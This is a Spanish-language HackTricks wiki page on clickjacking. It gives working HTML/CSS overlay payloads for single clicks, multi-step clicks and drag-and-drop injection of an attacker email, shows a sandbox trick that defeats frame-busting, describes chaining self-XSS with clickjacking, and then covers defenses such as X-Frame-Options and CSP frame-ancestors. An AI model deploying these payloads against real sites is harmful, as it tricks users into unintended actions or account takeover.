# Clickjacking

<details>

<summary><strong>Aprende hacking de AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f치cilmente con las herramientas comunitarias m치s avanzadas del mundo.\
Obt칠n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 쯈u칠 es el Clickjacking

En un ataque de clickjacking, un **usuario** es **enga침ado** para **hacer clic** en un **elemento** en una p치gina web que est치 **invisible** o disfrazado como un elemento diferente. Esta manipulaci칩n puede llevar a consecuencias no deseadas para el usuario, como la descarga de malware, redirecci칩n a p치ginas web maliciosas, provisi칩n de credenciales o informaci칩n sensible, transferencias de dinero o la compra en l칤nea de productos.


### Truco de prellenado de formularios

A veces es posible **rellenar el valor de campos de un formulario utilizando par치metros GET al cargar una p치gina**. Un atacante puede abusar de este comportamiento para rellenar un formulario con datos arbitrarios y enviar la carga de clickjacking para que el usuario presione el bot칩n Enviar.

### Rellenar formulario con Arrastrar y Soltar

Si necesitas que el usuario **llene un formulario** pero no deseas pedirle directamente que escriba informaci칩n espec칤fica (como el correo electr칩nico y/o una contrase침a espec칤fica que conozcas), simplemente puedes pedirle que **Arrastre y Suelte** algo que escribir치 tus datos controlados como en [**este ejemplo**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Carga B치sica de Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Carga 칰til de m칰ltiples pasos
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Carga 칰til de Arrastrar y Soltar + Click
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si has identificado un ataque de **XSS que requiere que un usuario haga clic** en alg칰n elemento para **activar** el XSS y la p치gina es **vulnerable al clickjacking**, podr칤as abusar de ello para enga침ar al usuario y hacer que haga clic en el bot칩n/enlace.  
Ejemplo:  
_Encontraste un **auto XSS** en algunos detalles privados de la cuenta (detalles que **solo t칰 puedes configurar y leer**). La p치gina con el **formulario** para establecer estos detalles es **vulnerable** al **clickjacking** y puedes **prellenar** el **formulario** con los par치metros GET._  
\_\_Un atacante podr칤a preparar un ataque de **clickjacking** a esa p치gina **prellenando** el **formulario** con el **payload XSS** y **enga침ando** al **usuario** para que **env칤e** el formulario. Entonces, **cuando se env칤e el formulario** y los valores se modifiquen, el **usuario ejecutar치 el XSS**.

## Estrategias para Mitigar el Clickjacking

### Defensas del Lado del Cliente

Los scripts ejecutados en el lado del cliente pueden realizar acciones para prevenir el Clickjacking:

* Asegurarse de que la ventana de la aplicaci칩n sea la ventana principal o superior.
* Hacer que todos los marcos sean visibles.
* Prevenir clics en marcos invisibles.
* Detectar y alertar a los usuarios sobre posibles intentos de Clickjacking.

Sin embargo, estos scripts de rompimiento de marcos pueden ser eludidos:

* **Configuraciones de Seguridad de los Navegadores:** Algunos navegadores pueden bloquear estos scripts seg칰n sus configuraciones de seguridad o falta de soporte de JavaScript.
* **Atributo `sandbox` del iframe de HTML5:** Un atacante puede neutralizar los scripts de rompimiento de marcos configurando el atributo `sandbox` con los valores `allow-forms` o `allow-scripts` sin `allow-top-navigation`. Esto evita que el iframe verifique si es la ventana superior, por ejemplo.
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
### Defensas del Lado del Servidor

#### X-Frame-Options

El encabezado de respuesta HTTP **`X-Frame-Options`** informa a los navegadores sobre la legitimidad de renderizar una p치gina en un `<frame>` o `<iframe>`, ayudando a prevenir el Clickjacking:

- `X-Frame-Options: deny` - Ning칰n dominio puede enmarcar el contenido.
- `X-Frame-Options: sameorigin` - Solo el sitio actual puede enmarcar el contenido.
- `X-Frame-Options: allow-from https://trusted.com` - Solo el 'uri' especificado puede enmarcar la p치gina.
- Nota las limitaciones: si el navegador no admite esta directiva, es posible que no funcione. Algunos navegadores prefieren la directiva de ancestros de marco CSP.

#### Directiva `frame-ancestors` de la Pol칤tica de Seguridad de Contenido (CSP)

La **directiva `frame-ancestors` en CSP** es el m칠todo recomendado para la protecci칩n contra Clickjacking:

- `frame-ancestors 'none'` - Similar a `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Similar a `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Similar a `X-Frame-Options: allow-from`.

Por ejemplo, la siguiente CSP solo permite enmarcar desde el mismo dominio:

`Content-Security-Policy: frame-ancestors 'self';`

Se pueden encontrar m치s detalles y ejemplos complejos en la [documentaci칩n de CSP de ancestros de marco](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) y en la [documentaci칩n de CSP de ancestros de marco de Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Pol칤tica de Seguridad de Contenido (CSP) con `child-src` y `frame-src`

La **Pol칤tica de Seguridad de Contenido (CSP)** es una medida de seguridad que ayuda a prevenir el Clickjacking y otros ataques de inyecci칩n de c칩digo al especificar qu칠 fuentes debe permitir el navegador cargar contenido.

#### Directiva `frame-src`
- Define fuentes v치lidas para marcos.
- M치s espec칤fico que la directiva `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Esta pol칤tica permite marcos del mismo origen (self) y https://trusted-website.com.

#### Directiva `child-src`
- Introducida en CSP nivel 2 para establecer fuentes v치lidas para trabajadores web y marcos.
- Act칰a como un respaldo para frame-src y worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Este documento permite marcos y workers del mismo origen (self) y https://trusted-website.com.

**Notas de Uso:**
- Desaprobaci칩n: child-src est치 siendo eliminado a favor de frame-src y worker-src.
- Comportamiento de Respaldo: Si frame-src est치 ausente, child-src se utiliza como respaldo para marcos. Si ambos est치n ausentes, se utiliza default-src.
- Definici칩n estricta de la fuente: Incluir solo fuentes confiables en las directivas para prevenir la explotaci칩n.

#### Scripts JavaScript de Rompimiento de Marcos

Aunque no son completamente infalibles, los scripts de rompimiento de marcos basados en JavaScript pueden ser utilizados para evitar que una p치gina web sea enmarcada. Ejemplo:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Empleo de Tokens Anti-CSRF

* **Validaci칩n de Tokens:** Utilice tokens anti-CSRF en aplicaciones web para garantizar que las solicitudes que cambian el estado sean realizadas intencionalmente por el usuario y no a trav칠s de una p치gina Clickjacked.

## Referencias

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f치cilmente con las herramientas comunitarias m치s avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si desea ver su **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulte los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nase al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤game** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparta sus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
